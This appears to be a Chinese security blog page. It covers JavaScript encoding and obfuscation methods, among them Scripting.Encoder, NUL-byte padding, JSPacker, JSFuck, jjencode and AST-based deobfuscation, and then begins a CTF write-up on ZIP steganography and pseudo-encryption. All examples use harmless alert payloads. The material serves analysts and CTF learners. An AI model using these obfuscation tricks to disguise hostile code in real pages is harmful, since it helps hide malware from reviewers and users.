<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT LANGUAGE=<span class="string">"JavaScript"</span>&gt; </div><div class="line"><span class="keyword">var</span> Senc=<span class="keyword">new</span> ActiveXObject(<span class="string">"Scripting.Encoder"</span>); </div><div class="line"><span class="keyword">var</span> code=<span class="string">'12345'</span>; </div><div class="line"><span class="keyword">var</span> Encode=Senc.EncodeScriptFile(<span class="string">".htm"</span>,code,<span class="number">0</span>,<span class="string">""</span>); </div><div class="line">alert(Encode); </div><div class="line">&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
<p>编码后的结果如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT LANGUAGE="JScript.Encode"&gt;#@~^BQAAAA==qy&amp;*l/wAAAA==^#~@&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
<p>解密方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT LANGUAGE=&quot;JScript.Encode&quot;&gt; </div><div class="line">function decode() </div><div class="line">alert(decode.toString()); </div><div class="line">&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
<p>它是原理是：编码后的代码运行前IE会先对其进行解码，如果我们先把加密的代码放入一个自定义函数如上面的decode()中，然后对自定义函数decode调用toString()方法，得到的将是解码后的代码！ </p>
<p>如果你觉得这样编码得到的代码LANGUAGE属性是JScript.Encode，很容易让人识破，那么还有一个几乎不为人知的window对象的方法execScript() ，其原形为： window.execScript( sExpression, sLanguage)</p>
<p>ps: 现在的es6中，已经不支持execScript了!!!</p>
<p>参数：<br>sExpression: 必选项。字符串(String)。要被执行的代码。<br>sLanguage　: 必选项。字符串(String)。指定执行的代码的语言。默认值为 Microsoft JScript </p>
<p><strong>工具选择</strong>：</p>
<p>加密工具： srcenc.exe</p>
<p>解密工具：srcdec18-VC8.exe</p>
<h4 id="0x3-2-4-任意添加NUL空字符（十六进制00H）"><a href="#0x3-2-4-任意添加NUL空字符（十六进制00H）" class="headerlink" title="0x3.2.4  任意添加NUL空字符（十六进制00H）"></a>0x3.2.4  任意添加NUL空字符（十六进制00H）</h4><p>一次偶然的实验，使我发现在HTML网页中任意位置添加任意个数的&quot;空字符&quot;，IE照样会正常显示其中的内容，并正常执行其中的JavaScript 代码，而我们在用一般的编辑器查看时，添加的&quot;空字符&quot;会显示形如空格或黑块，使得原码很难看懂，如用记事本查看&quot;空字符&quot;则会变成&quot;空格&quot;，</p>
<p>利用这个原理加密结果如下：（其中显示的&quot;空格&quot;代表&quot;空字符&quot;） </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;S C RI P T L ANG U A G E =<span class="string">" J a v a S c r i p t "</span>&gt; </div><div class="line">a l er t (<span class="string">" S w e e t"</span>) ; </div><div class="line">&lt; / SC R I P T&gt;</div></pre></td></tr></table></figure>
<p>如何？是不是显得乱七八糟的？如果不知道方法的人很难想到要去掉里面的&quot;空字符&quot;（00H）的！</p>
<h4 id="0x3-2-5-无用内容混乱以及换行空格TAB大法"><a href="#0x3-2-5-无用内容混乱以及换行空格TAB大法" class="headerlink" title="0x3.2.5 无用内容混乱以及换行空格TAB大法"></a>0x3.2.5 无用内容混乱以及换行空格TAB大法</h4><p>在JAVASCRIPT代码中我们可以加入大量的无用字符串或数字，以及无用代码和注释内容等等，使真正的有用代码埋没在其中，并把有用的 代码中能加入换行、空格、TAB的地方加入大量换行、空格、TAB，并可以把正常的字符串用&quot;&quot;来进行换行，这样就会使得代码难以看懂。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT LANGUAGE=<span class="string">"JavaScript"</span>&gt; </div><div class="line"><span class="string">"xajgxsadffgds"</span>;<span class="number">1234567890</span> </div><div class="line"><span class="number">625623216</span>;<span class="keyword">var</span> $=<span class="number">0</span>;alert<span class="comment">//@$%%&amp;*()(&amp;(^%^ </span></div><div class="line"><span class="comment">//cctv function// </span></div><div class="line">(<span class="comment">//hhsaasajx xc </span></div><div class="line"><span class="comment">/* </span></div><div class="line">asjgdsgu*/ </div><div class="line"><span class="string">"Sweet"</span><span class="comment">//ashjgfgf </span></div><div class="line"><span class="comment">/* </span></div><div class="line">@#%$^&amp;%$96667r45fggbhytjty </div><div class="line">*/ </div><div class="line"><span class="comment">//window </span></div><div class="line">) </div><div class="line">;<span class="string">"#@$#%@#432hu"</span>;<span class="number">212351436</span> </div><div class="line">&lt;<span class="regexp">/SCRIPT&gt;</span></div></pre></td></tr></table></figure>
<h4 id="0x3-2-6-JSPacker加解密"><a href="#0x3-2-6-JSPacker加解密" class="headerlink" title="0x3.2.6 JSPacker加解密"></a>0x3.2.6 JSPacker加解密</h4><p>这类最突出的特点就是eval(function(p,a,c,k,e,r).....</p>
<p>所以当你遇到这类代码的时候，不妨试着使用一下JSPacker解密工具</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//源代码</span></div><div class="line"><span class="built_in">eval</span>(<span class="number">1</span>);</div><div class="line"><span class="comment">//加密后代码</span></div><div class="line"><span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">p,a,c,k,e,r</span>)</span>&#123;e=<span class="built_in">String</span>;<span class="keyword">if</span>(!<span class="string">''</span>.replace(<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(c--)r[c]=k[c]||c;k=[<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> r[e]&#125;];e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">'\\w+'</span>&#125;;c=<span class="number">1</span>&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span>+e(c)+<span class="string">'\\b'</span>,<span class="string">'g'</span>),k[c]);<span class="keyword">return</span> p&#125;(<span class="string">'0(1);'</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="string">'alert|'</span>.split(<span class="string">'|'</span>),<span class="number">0</span>,&#123;&#125;))</div></pre></td></tr></table></figure>
<p>加解密工具：</p>
<p>tool.lu在线解密        <a href="http://tool.lu/js/" target="_blank" rel="external">http://tool.lu/js/</a></p>
<p>CSS-JS                <a href="https://tool.css-js.com/" target="_blank" rel="external">https://tool.css-js.com/</a></p>
<p>手动解密：            其实将加密后的代码美化之后，会发现return p语句，在此之前，你只需要加上一句console.log(p)就能获得对应的解密后代码。</p>
<h4 id="0x3-2-7-JSFuck加解密"><a href="#0x3-2-7-JSFuck加解密" class="headerlink" title="0x3.2.7 JSFuck加解密"></a>0x3.2.7 JSFuck加解密</h4><p>JSFuck 可以让你只用 6 个字符 <code>[ ]( ) ! +</code> 来编写 JavaScript 程序，所以很明显</p>
<p>jsfuck加密工具        <a href="http://www.jsfuck.com/" target="_blank" rel="external">http://www.jsfuck.com/</a></p>
<p>jsfuck解密工具        <a href="https://enkhee-osiris.github.io/Decoder-JSFuck/" target="_blank" rel="external">https://enkhee-osiris.github.io/Decoder-JSFuck/</a></p>
<p>​            手动：    其实jjencode的最后是一个函数，为此，我们只需要最后的()改成.toString()即可</p>
<h4 id="0x3-2-8-jjencode-aaencode"><a href="#0x3-2-8-jjencode-aaencode" class="headerlink" title="0x3.2.8 jjencode/aaencode"></a>0x3.2.8 jjencode/aaencode</h4><p>jjencode将JS代码转换成只有符号的字符串，类似于rrencode，但是符号大多数为\$+~[]\￥等</p>
<p>加密工具                <a href="http://utf-8.jp/public/jjencode.html" target="_blank" rel="external">http://utf-8.jp/public/jjencode.html</a></p>
<p>解密工具                <a href="https://github.com/jacobsoo/Decoder-JJEncode" target="_blank" rel="external">https://github.com/jacobsoo/Decoder-JJEncode</a></p>
<p>​            手动：    其实jjencode的最后是一个函数，为此，我们只需要最后的()改成.toString()即可</p>
<p>aaencode将JS代码转换成只有符号的字符串，aaencode可以将JS代码转换成常用的网络表情，也就是我们说的颜文字js加密。纯粹的表情</p>
<p>加密工具                <a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="external">http://utf-8.jp/public/aaencode.html</a></p>
<p>解密工具                <a href="https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html" target="_blank" rel="external">https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html</a></p>
<p>​            手动：    其实aaencode的最后是一个函数，为此，我们只需要最后的(&#39;_&#39;)改成.toString()即可</p>
<h4 id="0x3-2-9-jother加解密"><a href="#0x3-2-9-jother加解密" class="headerlink" title="0x3.2.9 jother加解密"></a>0x3.2.9 jother加解密</h4><p>jother是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括： <code>! + ( ) [ ] { }</code> 。只用这些字符就能完成对任意字符串的编码。不同于jsfuck，它多了{}这两个大括号</p>
<p>这里可以参考文章<a href="http://wps2015.org/drops/drops/jother%E7%BC%96%E7%A0%81%E4%B9%8B%E8%B0%9C.html" target="_blank" rel="external">jother编码之谜</a></p>
<p>加密工具                工具包-&gt;Misc-&gt;jother</p>
<p>解密工具                由于jother执行之后所得到的结果分为字符串和函数两种，所以解密的方法也不相同。</p>
<p>​            字符串：直接在Console界面中输入并回车即可</p>
<p>​            函数：    对于函数类型的jother加密结果，我们只需要将最后的()改成.toString()即可</p>
<h4 id="0x3-2-10-自定义加密算法"><a href="#0x3-2-10-自定义加密算法" class="headerlink" title="0x3.2.10 自定义加密算法"></a>0x3.2.10 自定义加密算法</h4><p>这无疑是这里面最难的一类。这样的一类算法，有可能是非对称的，经过加密之后仍能完成对应的功能！</p>
<p>当然有些对称的，如果作者给出解密算法，可能就比较容易。关键是作者会不会这么做了</p>
<p>ps：基于大多数情况下，js代码加密之后，对应代码不一定能执行，所以通常js文件中会有对应的解密算法！</p>
<h3 id="0x3-3-js混淆"><a href="#0x3-3-js混淆" class="headerlink" title="0x3.3 js混淆"></a>0x3.3 js混淆</h3><p>混淆应该是工业界和ctf题中用得最多的方式之一了。Javascript 作为一种运行在客户端的脚本语言，其源代码对用户来说是完全可见的。但不是每一个 js 开发者都希望自己的代码能被直接阅读，比如恶意软件的制造者们。为了增加代码分析的难度，混淆（obfuscate）工具被应用到了许多恶意软件（如 0day 挂马、跨站攻击等）当中。分析人员为了掀开恶意软件的面纱，首先就得对脚本进行反混淆（deobfuscate）处理。</p>
<p><strong>这一节的js混淆，强调的只是复杂化表达式</strong></p>
<p>代码混淆不一定会调用 eval，也可以通过在代码中填充无效的指令来增加代码复杂度，极大地降低可读性。Javascript 中存在许多称得上丧心病狂的特性，这些特性组合起来，可以把原本简单的字面量（Literal）、成员访问（MemberExpression）、函数调 用（CallExpression）等代码片段变得难以阅读。</p>
<p>Js 中的字面量有字符串、数字、正则表达式</p>
<p>下面简单举一个例子。</p>
<ul>
<li>访问一个对象的成员有两种方法——点运算符和下标运算符。调用 window 的 eval 方法，既可以写成 <code>window.eval()</code>，也可以 <code>window[&#39;eval&#39;]</code>；</li>
<li>为了让代码更变态一些，混淆器选用第二种写法，然后再在字符串字面量上做文章。先把字符串拆成几个部分：<code>&#39;e&#39; + &#39;v&#39; + &#39;al&#39;</code>；</li>
<li>这样看上去还是很明显，再利用一个数字进制转换的技巧：<code>14..toString(15) + 31..toString(32) + 0xf1.toString(22)</code>；</li>
<li>一不做二不休，把数字也展开：<code>(0b1110).toString(4&lt;&lt;2) + (&#39; &#39;.charCodeAt() - 1).toString(Math.log(0x100000000) / Math.log(2)) + 0xf1.toString(11 &lt;&lt; 1)</code>；</li>
<li>最后的效果：<code>window[(2*7).toString(4&lt;&lt;2) + (&#39; &#39;.charCodeAt() - 1).toString(Math.log(0x100000000) / Math.log(2)) + 0xf1.toString(11 &lt;&lt; 1)](&#39;alert(1)&#39;)</code></li>
</ul>
<p>在 js 中可以找到许多这样互逆的运算，通过使用随机生成的方式将其组合使用，可以把简单的表达式无限复杂化。</p>
<h4 id="0x3-3-1-解析和变换代码"><a href="#0x3-3-1-解析和变换代码" class="headerlink" title="0x3.3.1 解析和变换代码"></a>0x3.3.1 解析和变换代码</h4><p>本文对 Javascript 实现反混淆的思路是模拟执行代码中可预测结果的部分，编写一个简单的脚本执行引擎，只执行符合某些预定规则的代码块，最后将计算结果替换掉原本冗长的代码，实现表达式的简化。</p>
<p>如果对脚本引擎解释器的原理有初步了解的话，可以知道解释器在为了“读懂”代码，会对源代码进行词法分析、语法分析，将代码的字符串转换为抽象语法树（<a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree" target="_blank" rel="external">Abstract Syntax Tree</a>, AST）的数据形式。</p>
<p>如这段代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = <span class="number">42</span>; <span class="keyword">var</span> b = <span class="number">5</span>; <span class="function"><span class="keyword">function</span> <span class="title">addA</span>(<span class="params">d</span>) </span>&#123; <span class="keyword">return</span> a + d; &#125; <span class="keyword">var</span> c = addA(<span class="number">2</span>) + b;</div></pre></td></tr></table></figure>
<p>对应的语法树如图：</p>
<p><img src="/images/2017-11-12/31.png" alt=""></p>
<p>（由 <a href="http://jointjs.com/demos/javascript-ast" target="_blank" rel="external">JointJS</a>的在线工具生成）</p>
<p>不考虑 JIT 技术，解释器可以从语法树的根节点开始，使用深度优先遍历整棵树的所有节点，根据节点上分析出来的指令逐个执行，直到脚本结束返回结果。</p>
<p>通过 js 代码生成抽象语法树的工具很多，如压缩器 <a href="https://github.com/mishoo/UglifyJS" target="_blank" rel="external">UglifyJS</a> 带的 parser，还有本文使用的 <a href="http://esprima.org/" target="_blank" rel="external">esprima</a>。</p>
<p>esprima 提供的接口很简单：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> ast = <span class="built_in">require</span>(<span class="string">'esprima'</span>).parse(code)</div></pre></td></tr></table></figure>
<p>另外 Esprima 提供了一个在线工具，可以把任意（合法的）Javascript 代码解析成为 AST 并输出： <a href="http://esprima.org/demo/parse.html" target="_blank" rel="external">http://esprima.org/demo/parse.html</a></p>
<p>再结合 estools 的几个辅助库即可对 js 进行静态代码分析：</p>
<ul>
<li><a href="https://github.com/estools/escope" target="_blank" rel="external">escope</a> Javascript 作用域分析工具</li>
<li><a href="https://github.com/estools/esutils" target="_blank" rel="external">esutil</a> 辅助函数库，检查语法树节点是否满足某些条件</li>
<li><a href="http://github.com/estools/estraverse" target="_blank" rel="external">estraverse</a>语法树遍历辅助库，接口有一点类似 SAX 方式解析 XML</li>
<li><a href="http://github.com/estools/esrecurse" target="_blank" rel="external">esrecurse</a> 另一个语法树遍历工具，使用递归</li>
<li><a href="https://github.com/estools/esquery" target="_blank" rel="external">esquery</a> 使用 css 选择器的语法从语法树中提取符合条件的节点</li>
<li><a href="http://github.com/estools/escodegen" target="_blank" rel="external">escodegen</a>与 esprima 功能互逆，将语法树还原为代码</li>
</ul>
<p>项目中使用的遍历工具是 estraverse。其提供了两个静态方法，<code>estraverse.traverse</code> 和 <code>estraverse.replace</code>。前者单纯遍历 AST 的节点，通过返回值控制是否继续遍历到叶子节点；而 replace 方法则可以在遍历的过程中直接修改 AST，实现代码重构功能。具体的用法可以参考其官方文档，或者本文附带的示例代码。</p>
<h4 id="0x3-3-2-规则设计"><a href="#0x3-3-2-规则设计" class="headerlink" title="0x3.3.2 规则设计"></a>0x3.3.2 规则设计</h4><p>从实际遇到的代码入手。最近在研究一些 XSS 蠕虫的时候遇到了类似如下代码混淆：</p>
<p><img src="/images/2017-11-12/41.png" alt=""></p>
<p>观察其代码风格，发现这个混淆器做了这几件事：</p>
<ul>
<li>字符串字面量混淆：首先提取全部的字符串，在全局作用域创建一个字符串数组，同时转义字符增大阅读难度，然后将字符串出现的地方替换成为数组元素的引用</li>
<li>变量名混淆：不同于压缩器的缩短命名，此处使用了下划线加数字的格式，变量之间区分度很低，相比单个字母更难以阅读</li>
<li>成员运算符混淆：将点运算符替换为字符串下标形式，然后对字符串进行混淆</li>
<li>删除多余的空白字符：减小文件体积，这是所有压缩器都会做的事</li>
</ul>
<p>经过搜索，这样的代码很有可能是通过 <a href="http://javascriptobfuscator.com/Javascript-Obfuscator.aspx" target="_blank" rel="external">javascriptobfuscator.com</a>的免费版生成的。其中免费版可以使用的三个选项（<code>Encode Strings / Move Strings / Replace Names</code>）也印证了前面观察到的现象。</p>
<p>这些变换中，变量名混淆是不可逆的。要是可以智能给变量命名的工具也不错，比如这个 <a href="http://jsnice.org/" target="_blank" rel="external">jsnice</a> 网站提供了一个在线工具，可以分析变量具体作用自动重命名。就算不能做到十全十美，实在不行就用人工的方式，使用 IDE（如 WebStorm）的代码重构功能，结合代码行为分析进行手工重命名还原。</p>
<p>再看字符串的处理。由于字符串将会被提取到一个全局的数组，在语法树中可以观察到这样的特征： 在全局作用域下，出现一个 VariableDeclarator，其 init 属性为 ArrayExpression，而且所有元素都是 Literal ——这说明这个数组所有元素都是常量。简单地将其求值，与变量名（标识符）关联起来。注意，此处为了简化处理，并没有考虑变量名作用域链的问题。在 js 中，作用域链上存在变量名的优先级，比如全局上的变量名是可以被局部变量重新定义的。如果混淆器再变态一点，在不同的作用域上使用相同的变量名，反混淆器 又没有处理作用域的情况，将会导致解出来的代码出错。</p>
<p>在测试程序中我设置了如下的替换规则：</p>
<ul>
<li>全局变量声明的字符串数组，在代码中直接使用数字下标引用其值</li>
<li>结果确定的一连串二元运算，如 <code>1 * 2 + 3 / 4 - 6 % 5</code></li>
<li>正则表达式字面量的 source，字符串字面量的 length</li>
<li>完全由字符串常量组成的数组，其<code>join / reverse / slice</code> 等方法的返回值</li>
<li>字符串常量的 <code>substr / charAt</code> 等方法的返回值</li>
<li>decodeURIComponent 等全局函数，其所有参数为常量的，替换为其返回值</li>
<li>结果为常数的数学函数调用，如 <code>Math.sin(3.14)</code></li>
</ul>
<p>至于缩进的还原，这是 escodegen 自带的功能。在调用 <code>escodegen.generate</code>方法生成代码的时候使用默认的配置（忽略第二个参数）即可。</p>
<h4 id="0x3-3-3-DEMO-程序"><a href="#0x3-3-3-DEMO-程序" class="headerlink" title="0x3.3.3 DEMO 程序"></a>0x3.3.3 DEMO 程序</h4><p>这个反混淆器的原型放在 GitHub 上：<a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="external">https://github.com/ChiChou/etacsufbo</a></p>
<p>运行环境和使用方法参考仓库的 README。</p>
<p>从  <a href="http://youmightnotneedjquery.com/" target="_blank" rel="external">YOU MIGHT NOT NEED JQUERY</a>上摘抄了一段代码，放入 <a href="https://javascriptobfuscator.com/Javascript-Obfuscator.aspx" target="_blank" rel="external">javascriptobfuscator.com</a> 测试混淆：</p>
<p><img src="/images/2017-11-12/52.png" alt=""></p>
<p>将混淆结果<a href="https://github.com/ChiChou/etacsufbo/blob/master/tests/cases/jsobfuscator.com.js" target="_blank" rel="external">https://github.com/ChiChou/etacsufbo/blob/master/tests/cases/jsobfuscator.com.js</a>进行解开，结果如下：</p>
<p><img src="/images/2017-11-12/61.png" alt=""></p>
<p>虽然变量名可读性依旧很差，但已经可以大体看出代码的行为了。</p>
<p>演示程序目前存在大量局限性，只能算一个半自动的辅助工具，还有许多没有实现的功能。</p>
<p>一些混淆器会对字符串字面量进行更复杂的保护，将字符串转换为 f(x) 的形式，其中 f 函数为一个解密函数，参数 x 为密文的字符串。也有原地生成一个匿名函数，返回值为字符串的。这种方式通常使用的函数表达式具有上下文无关的特性——其返回值只与函数的输入有关，与当 前代码所处的上下文（比如类的成员、DOM 中取到的值）无关。如以下代码片段中的 xor 函数：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> xor = <span class="function"><span class="keyword">function</span>(<span class="params">str, a, b</span>) </span>&#123;</div></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode.apply(<span class="literal">null</span>, str.split(<span class="string">''</span>).map(<span class="function"><span class="keyword">function</span>(<span class="params">c, i</span>) </span>&#123; <span class="keyword">var</span> ascii = c.charCodeAt(<span class="number">0</span>);</div></pre></td></tr></table></figure>
<p>如何判断某个函数是否具有这样的特性呢？首先一些库函数可以确定符合，如 <code>btoa，escape，String.fromCharCode</code> 等，只要输入值是常量，返回值就是固定的。建立一个这样的内置函数白名单，接着遍历函数表达式的 AST，若该函数参与计算的参数均没有来自外部上下文，且其所有 CallExpression 的 callee 在函数白名单内，那么通过递归的方式可以确认一个函数是否满足条件。</p>
<p>还有的混淆器会给变量创建大量的引用实例，也就是给同一个对象使用了多个别名，阅读起来非常具有干扰性。可以派出 escope 工具对变量标识符进行数据流分析，替换为所指向的正确值。还有利用数学的恒等式进行混淆的。如声明一个变量 a，若 a 为 Number，则表达式 <code>a-a</code>、<code>a * 0</code> 均恒为 0。但如果 a 满足 <code>isNaN(a)</code>，则表达式返回 <code>NaN</code>。要清理这类代码，同样需要借助数据流分析的方法。</p>
<p>目前还没有见到使用扁平化流程跳转实现的 js 混淆样本，笔者认为可能跟 js 语言本身的使用场景和特点有关。一般 js 的代都是偏业务型的，不会有太复杂的流程控制或者算法，混淆起来效果不一定理想。</p>
<h4 id="0x3-3-4-工具总结"><a href="#0x3-3-4-工具总结" class="headerlink" title="0x3.3.4 工具总结"></a>0x3.3.4 工具总结</h4><p>混淆工具：        <a href="https://javascriptobfuscator.com/Javascript-Obfuscator.aspx" target="_blank" rel="external">https://javascriptobfuscator.com/Javascript-Obfuscator.aspx</a>    ( Encode Strings / Move Strings / Replace Names )</p>
<p>​                <a href="http://tool.lu/js/" target="_blank" rel="external">http://tool.lu/js/</a>        ( Replace Names )</p>
<p>​                <a href="https://jscrambler.com" target="_blank" rel="external">https://jscrambler.com</a></p>
<p>去混淆工具：        <a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="external">https://github.com/ChiChou/etacsufbo</a>  ( 该工具去混淆能力太差 )</p>
<p>​                <a href="http://jsnice.org/" target="_blank" rel="external">http://jsnice.org/</a></p>
<p>​                <a href="http://www.bm8.com.cn/jsConfusion/" target="_blank" rel="external">http://www.bm8.com.cn/jsConfusion/</a></p>
<p>​        反混淆终极工具： <a href="https://prepack.io/" target="_blank" rel="external">https://prepack.io/</a></p>
<p>​        最终推荐： 如果代码量不是特别大的化，手动去混淆吧，少年！</p>
<p>这儿找到了一个手动去混淆的栗子，供大家观摩<a href="https://www.blackglory.me/l1l-document-all-features-detailed-js-confused-with-anti-aliasing-process/" target="_blank" rel="external">https://www.blackglory.me/l1l-document-all-features-detailed-js-confused-with-anti-aliasing-process/</a></p>
<p>​                </p>
<p>​            </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/12/CTF比赛中关于zip的总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/11/12/CTF比赛中关于zip的总结/" itemprop="url">CTF比赛中关于zip的总结</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-12T10:22:32+08:00">
                2017-11-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/misc/" itemprop="url" rel="index">
                    <span itemprop="name">misc</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>本文摘抄于<a href="http://www.360zhijia.com/360anquanke/217342.html" target="_blank" rel="external">http://www.360zhijia.com/360anquanke/217342.html</a></p>
<p><strong>前言</strong></p>
<p>在CTF比赛的MISC和CRYPTO中，经常要和zip压缩包打交道，这里做一个zip方面的总结。</p>
<p>本文中用到的所有文件和工具都可在这个网盘中找到<a href="http://pan.baidu.com/s/1bWQxyA" target="_blank" rel="external">http://pan.baidu.com/s/1bWQxyA</a></p>
<p><strong>0x01. 通过进制转换隐藏信息：</strong></p>
<p>这种方法比较简单，直接拿一道题讲解（题目来自ISCC 2017 Basic-04）。题目给了一个txt文档如下图</p>
<p><img src="/images/2017-11-12/3e25b7a0-4b87-4c8b-846f-0be33bf3eba5.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>经过观察，所有数据都在16进制能表示的范围之内，因此先尝试使用十六进制编码解密，python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">with</span> open(<span class="string">'Basic-04.txt'</span>) <span class="keyword">as</span> f:</div><div class="line">    cipher = f.read()<span class="comment">#读取txt内容</span></div><div class="line">    plain = cipher.decode(<span class="string">'hex'</span>)<span class="comment">#16进制编码解密</span></div><div class="line">    <span class="keyword">print</span> plain</div></pre></td></tr></table></figure>
<p>运行结果如下，虽然存在大量乱码，但还是能看到flag.txt，因此猜测txt中的这段字符是zip包的16进制表示（同时开头的PK也暗示这是一个zip包，PK是zip格式发明者Phil Katz的名称缩写，zip的前两个字母就用了PK）</p>
<p><img src="/images/2017-11-12/b62f4eaa-3cc6-4b67-9c05-e254dbd74a00.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>导入到16进制编辑器中，这里用010editor做演示</p>
<p><img src="/images/2017-11-12/9c17b419-0b59-48a1-b885-43a689efc3d1.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>导入后选择 Save As（快捷键 ctrl + shift + s），给新文件命名时加上后缀.zip，保存后发现zip文件是正常的，因此证明思路正确，此题的后续过程请继续阅读这篇文章</p>
<p><img src="/images/2017-11-12/ee893556-4336-43f8-9c5f-fee6301bb5ea.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>另：除了16进制的编码转换，有时还会遇到2进制编码的转换，思路相同，不再复述</p>
<p><strong>0x02. 在图片中隐藏压缩包（</strong><a href="http://baike.baidu.com/item/%E5%9B%BE%E7%A7%8D" target="_blank" rel="external"><strong>图种</strong></a><strong>）</strong></p>
<p>这种方法大概是zip中最常见的，多用于在一张图片中隐藏一个压缩包，这种方法的原理是：以jpg格式的图片为例，<font color="#f00">一个完整的 JPG 文件由 FF D8 开头，FF D9结尾，图片浏览器会忽略 FF D9 以后的内容，因此可以在 JPG 文件中加入其他文件。</font></p>
<p>也以一道题为例为例（ISCC 2017 Basic-07），对于这种隐写最简单的方法是使用Kali下的binwalk进行检测，binwalk 图片名 如下，检测出图片中存在压缩包</p>
<p><img src="/images/2017-11-12/5dda6aaa-d385-4484-a016-924fa3b455b4.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>分离这个压缩包也有至少两种方法：</p>
<ol>
<li>利用Linux下的foremost工具， foremost 图片名 如下，foremost默认的输出文件夹为output，在这个文件夹中可以找到分离出的zip（推荐使用这种方法，因为foremost还能分离出其他隐藏的文件）</li>
</ol>
<p><img src="/images/2017-11-12/748af5ce-12c7-49ef-9294-9236252f62ac.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<ol start="2">
<li>更简单粗暴的方法是直接把图片的后缀改为.zip，然后解压即可（这种方法虽然简单快速，但如果隐写了多个文件时可能会失败）</li>
</ol>
<p><img src="/images/2017-11-12/0ff33b0f-00fd-4989-a3e1-79acd0508ba2.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>另：本题后续步骤为构造字典，爆破握手包</p>
<p><strong>0x03. 伪加密</strong></p>
<p>Zip伪加密与zip的文件格式有关（zip的格式详解请翻到本文的最后0x07部分），zip中有一位是标记文件是否加密的，如果更改一个未加密zip包的加密标记位，那么在打开压缩包时就会提示该文件是加密的。</p>
